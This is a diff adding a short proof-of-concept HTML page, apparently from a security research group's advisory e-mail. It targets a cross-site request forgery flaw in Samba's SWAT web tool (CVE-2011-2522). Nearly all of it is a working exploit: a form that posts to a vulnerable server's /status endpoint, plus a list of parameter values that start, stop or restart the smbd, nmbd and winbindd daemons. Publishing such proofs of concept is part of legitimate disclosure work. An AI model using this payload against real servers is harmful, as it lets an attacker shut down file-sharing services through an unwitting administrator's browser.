@@ -1,0 +1,30 @@
+<!--
+# Secur-I Research Group - Proof-of-Concept
+# ==========================================================================
+# Title: Cross-Site Request Forgery in SWAT (Samba Web Administration Tool)
+# Vulnerable versions: Samba 3.0.x - 3.5.9 (inclusive)
+# Fixed version: Samba 3.5.10
+# Product Homepage: http://www.samba.org/
+# CVE-ID: CVE-2011-2522
+# References: http://www.samba.org/samba/security/CVE-2011-2522
+# ==========================================================================
+-->
+
+<html>
+<body>
+<form method=post action="http://VULN_SERVER:901/status">
+<input type=submit onclick=window.open("http://securview.com") name="VUL_PARM" value="w00t!">
+</body>
+</html>
+
+<!--
+VUL_PARM could be one of the following:-
+smbd_start, smbd_stop, smbd_restart : To start/stop/restart smbd(Samba) daemon
+nmbd_start, nmbd_stop, nmbd_restart : To start/stop/restart nmbd(NETBIOS) daemon
+winbindd_start, winbindd_stop, winbindd_restart : To start/stop/restart winbindd(Windows Name Service Switch) daemon
+-->
+
+Thanks & Regards,
+Narendra.
+
+Confidentiality: This e-mail and any attachments may be confidential and may also be privileged. If you are not an intended named recipient, please notify the sender immediately and do not disclose the contents to another person use it for any purpose, or store or copy the information in any medium.
